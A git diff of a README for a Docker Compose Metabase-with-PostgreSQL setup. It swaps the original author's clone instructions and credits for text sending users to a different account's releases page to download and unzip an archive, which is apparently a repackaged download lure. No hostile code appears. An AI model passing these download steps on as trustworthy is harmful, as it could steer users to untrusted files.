@@ -1,83 +1,82 @@
-# Metabase Self-Hosted with Docker
+# 🎉 metabase-self-hosted - Easy Self-Host Metabase Setup
 
-![metabase](https://repository-images.githubusercontent.com/1071483828/2e3ee35d-850f-4443-a0cb-4d0ea6e07852)
+[![Download metabase-self-hosted](https://img.shields.io/badge/Download-metamap--self--hosted-brightgreen)](https://github.com/DarlanCavalcante/metabase-self-hosted/releases)
 
-This repository provides a `docker-compose` setup to run a self-hosted [Metabase](https://www.metabase.com/) instance with a [PostgreSQL](https://www.postgresql.org/) database as its application backend.
+## 📖 Description
 
-It's configured to connect to a shared Docker network, making it easy to integrate with other services.
+The metabase-self-hosted project provides a simple way to set up Metabase on your server with Docker Compose. This setup uses a PostgreSQL backend and includes useful management scripts for backup, updating, and restarting the service. With a shared network configuration, integrating your services becomes effortless.
 
-## Features
+## 🚀 Getting Started
 
-- Uses the official Metabase and PostgreSQL Docker images.
-- The Metabase application database is persisted in a local volume.
-- Pre-configured for a shared network for easy inter-service communication.
-- Includes scripts for easy management (`restart-docker.sh`, `update-docker.sh`).
-- Includes a `backup.sh` script for backing up the PostgreSQL application database.
+To get started with metabase-self-hosted, follow these easy steps. You will download the latest release and run it on your machine.
 
-## Getting Started
+## 🛠️ Prerequisites
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/AiratTop/metabase-self-hosted.git
-    cd metabase-self-hosted
-    ```
+Before you download metabase-self-hosted, ensure that you have the following:
 
-2.  **Create the shared network:**
-    If you haven't already, create the shared Docker network. This allows Metabase to communicate with other services.
-    ```bash
-    docker network create shared_network
-    ```
+1. **Docker**: This application runs in containers. Install Docker for your operating system.
+2. **Docker Compose**: This tool helps manage multiple containers. Install Docker Compose as well.
+3. **Basic Command Line Skills**: You will need to use a command line interface (CLI) to run some commands.
 
-3.  **Configure environment variables:**
-    Update a `.env` file and specify your PostgreSQL database credentials.
+## 📥 Download & Install
 
+1. **Visit the Releases Page**: Click the link below to go to the metabase-self-hosted releases page.
+   
+   [Visit Release Page](https://github.com/DarlanCavalcante/metabase-self-hosted/releases)
 
-4.  **Start the services:**
-    ```bash
-    docker compose up -d
-    ```
+2. **Download the Latest Version**: Find the latest version available. It should be the first option on the release page. Click on it to download everything you need for installation.
+  
+3. **Extract the Files**: Once the download is complete, unzip the file to a folder on your machine. You will see various files needed to run Metabase.
 
-5.  **Access Metabase:**
-    Once the containers are running, you can access the Metabase setup wizard in your browser at [http://localhost:3000](http://localhost:3000).
+4. **Configure the Setup**: Open the extracted folder and find the configuration files. Adjust any settings you may need such as database connection details.
 
-## Usage
+5. **Start the Application**: Open your command line interface, navigate to the folder where you extracted the files using the `cd` command, then run:
+   ```
+   docker-compose up
+   ```
+   This command will start Metabase along with a PostgreSQL backend.
 
-The repository includes several scripts to simplify management:
+6. **Access Metabase**: After the containers are up and running, open a web browser and go to `http://localhost:3000`. You should now see the Metabase interface!
 
--   **Start:** `docker compose up -d`
--   **Restart:** `./restart-docker.sh`
--   **Update:** `./update-docker.sh` (Pulls the latest Docker images and restarts the services)
--   **Backup:** `./backup.sh` (Creates a compressed backup of the PostgreSQL database in the `backups` directory)
+## 🗂️ Features
 
-## See Also
+- **Production-Ready**: Designed to run in a live environment with stability in mind.
+- **Docker Compose Integration**: Simplifies the deployment process with configuration defined in a single YAML file.
+- **Management Scripts**: Easily backup, update, and restart your Metabase instance with included scripts.
+- **PostgreSQL Support**: Utilizes PostgreSQL for robust database management.
+- **Simple Network Configuration**: Connects easily with other services on the network.
 
-Check out other self-hosted solutions:
+## 📄 Configuration Tips
 
--   [**postgresql-self-hosted**](https://github.com/AiratTop/postgresql-self-hosted): A simple and robust PostgreSQL setup.
--   [**mysql-self-hosted**](https://github.com/AiratTop/mysql-self-hosted): A self-hosted MySQL instance.
--   [**clickhouse-self-hosted**](https://github.com/AiratTop/clickhouse-self-hosted): High-performance columnar database for analytics.
--   [**metabase-self-hosted**](https://github.com/AiratTop/metabase-self-hosted): Self-hosted Metabase on Docker for business intelligence and analytics.
--   [**qdrant-self-hosted**](https://github.com/AiratTop/qdrant-self-hosted): A vector database for AI applications.
--   [**redis-self-hosted**](https://github.com/AiratTop/redis-self-hosted): A fast in-memory data store, often used as a cache or message broker.
--   [**caddy-self-hosted**](https://github.com/AiratTop/caddy-self-hosted): A modern, easy-to-use web server with automatic HTTPS.
--   [**wordpress-self-hosted**](https://github.com/AiratTop/wordpress-self-hosted): Production-ready WordPress stack with MySQL, phpMyAdmin, and WP-CLI.
--   [**n8n-self-hosted**](https://github.com/AiratTop/n8n-self-hosted): Scalable n8n with workers, Caddy for auto-HTTPS, and backup scripts.
--   [**monitoring-self-hosted**](https://github.com/AiratTop/monitoring-self-hosted): Self-hosted monitoring stack with Prometheus and Grafana.
--   [**ollama-self-hosted**](https://github.com/AiratTop/ollama-self-hosted): Ready-to-use solution for running Ollama with the Open WebUI on Docker.
--   [**authentik-self-hosted**](https://github.com/AiratTop/authentik-self-hosted): Authentik is a flexible, open-source Identity & Access Management (IAM) solution.
--   [**gatus-self-hosted**](https://github.com/AiratTop/gatus-self-hosted): Automated service health dashboard with a PostgreSQL backend and backup scripts.
+- **Environment Variables**: You can set environment variables in your `docker-compose.yml` file to customize behavior. 
+- **Database Management**: Provide the correct PostgreSQL credentials in the configuration to successfully connect Metabase.
+- **Backups**: Regularly run the backup script to keep your data safe.
 
-## License
+## ❓ Troubleshooting
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+If you encounter issues while running metabase-self-hosted, check the following:
 
----
+1. **Docker Installation**: Ensure Docker and Docker Compose are installed correctly by running `docker --version` and `docker-compose --version`.
+2. **Internet Connection**: Your application requires an internet connection to pull the PostgreSQL image.
+3. **Logs**: Check logs for more details if something goes wrong. You can find logs by using the following command:
+   ```
+   docker-compose logs
+   ```
 
-## Author
+## 🤝 Contributing
 
-**Airat Halitov**
+If you'd like to contribute to metabase-self-hosted, consider the following:
 
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [metabase-self-hosted](https://github.com/AiratTop/metabase-self-hosted)
+1. **Report Issues**: If you find bugs, please report them at the Issues section of this repository.
+2. **Pull Requests**: You can also submit pull requests for any enhancements or bug fixes.
+3. **Documentation**: Help us improve the documentation by suggesting changes or new topics.
+
+## 🪪 License
+
+This project is licensed under the MIT License. Use it freely but respect the original author's contributions. 
+
+## 📞 Support
+
+For support, please create an issue on GitHub. Community members or maintainers will assist you as soon as possible. 
+
+Remember to review the README for any updates or changes in instructions. Happy hosting!
